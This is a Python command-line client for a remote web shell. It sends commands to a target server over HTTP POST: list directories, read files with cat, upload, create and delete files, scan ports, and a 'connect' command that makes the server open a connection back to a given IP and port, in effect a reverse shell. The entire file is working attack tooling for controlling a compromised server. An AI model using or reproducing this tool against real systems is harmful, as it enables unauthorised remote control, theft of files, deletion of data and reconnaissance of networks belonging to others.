import requests
import sys, os
from timeit import default_timer as timer
from cmd import Cmd
import threading
sys.path.insert(0, '../..')

import color

class Shell(Cmd):
    prompt = "shell> ".format(color.RED, color.UNDERLINE, color.END, color.END)
    s = requests.Session()

    try:
        machine = sys.argv[1]
    except:
        print("{}error: give server as argument{}".format(color.RED, color.END))

    def init(self, machine):
        self.machine = machine

    def request(self, payload):
        res = self.s.post("{}".format(self.machine), data=payload)
        print(res.text)

    def do_dir(self, line):
        """
list all files and directories
        """
        self.request({"request": "dir", "value": ""})
    
    def do_cd(self, line):
        """
change directory
        """
        self.request({"request": "cd", "value": line})

    def do_pwd(self, line):
        """
print working directory
        """
        self.request({"request": "pwd", "value": ""})

    def do_connect(self, line):
        """
get a connection back to given ip and port
        """
        data = line.split(" ")
        try:
            self.request({"request": "connect", "value": data[0], "value2": data[1]})
        except: pass
    
    def do_my_ip(self, line):
        """
check your ip address
        """
        self.request({"request": "my_ip"})

    def do_port_scan(self, line):
        data = line.split(" ")
        self.request({"request": "port_scan", "sport": data[0], "eport": data[1]})

    def do_upload(self, line):
        """
upload a file to server
        """
        if os.path.isfile(line):
            files = {"fileToUpload": open(line, "rb")}
            res = self.s.post("{}".format(self.machine), files=files, data={"request": "upload"})
            print(res.text)
        else:
            print("{}error: file not found{}".format(color.RED, color.END))

    def do_cat(self, line):
        """
read content of a file
        """
        self.request({"request": "cat", "value": line})

    def do_touch(self, line):
        """
create new file(s)
        """
        self.request({"request": "touch", "value": line})

    def do_mkdir(self, line):
        """
create new directory
        """
        self.request({"request": "mkdir", "value": line})

    def do_del(self, line):
        """
delete a file or directory
        """
        self.request({"request": "del", "value": line})
    
    def do_break(self, line):
        """
terminate shell
        """
        return True


if __name__ == '__main__':
    cmd = Shell()
    cmd.cmdloop()